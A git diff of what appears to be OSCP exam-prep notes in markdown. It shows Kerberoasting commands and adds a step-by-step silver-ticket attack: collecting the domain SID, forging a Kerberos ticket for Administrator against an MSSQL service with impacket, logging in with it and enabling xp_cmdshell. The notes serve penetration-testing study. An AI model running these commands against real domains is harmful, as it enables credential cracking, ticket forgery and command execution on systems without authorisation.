@@ -335,7 +335,30 @@ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
-## Silver ticket
+### Silver ticket(check this out https://systemweakness.com/vulnlab-breach-7db2bb800e88)
+![image](https://github.com/nuricheun/OSCP/assets/14031269/8ae60d0a-57a7-4705-bbc2-8c67dbd4437a)
+![image](https://github.com/nuricheun/OSCP/assets/14031269/139b464b-ab01-45a6-80db-e81649083988)
+![image](https://github.com/nuricheun/OSCP/assets/14031269/08567fbc-49fc-47a2-b0bf-6da3bc5f5e93)
+
+1. grab spn's password, spn name
+2. grab domain SID
+```bash
+lookupsid.py dom.htb/nuri.jeon:password@192.168.x.x
+```
+3. generate ntlm hash(https://codebeautify.org/ntlm-hash-generator)
+4. Now we can use the information obtained to be able to get a silver ticket:
+```bash
+tickter.py -nthash hashhashhashhash -domain-sid S-1-5-21-xxxxx -domain dom.htb -spn 'MSSQL...' -user-id 500 Administrator
+```
+5. login using mssqlclient.py
+```bash
+export KRB5CCNAME=/home...
+mssqlclient.py dom.htb -k -no-pass -windows-auth
+
+enable_xp_cmdshell
+```
+
+
 ![image](https://github.com/nuricheun/OSCP/assets/14031269/f699a792-5dbe-4804-bf52-977e0fee4888)
 ![image](https://github.com/nuricheun/OSCP/assets/14031269/fd16d1df-f248-4256-9b33-2230470bcea4)
 ```bash
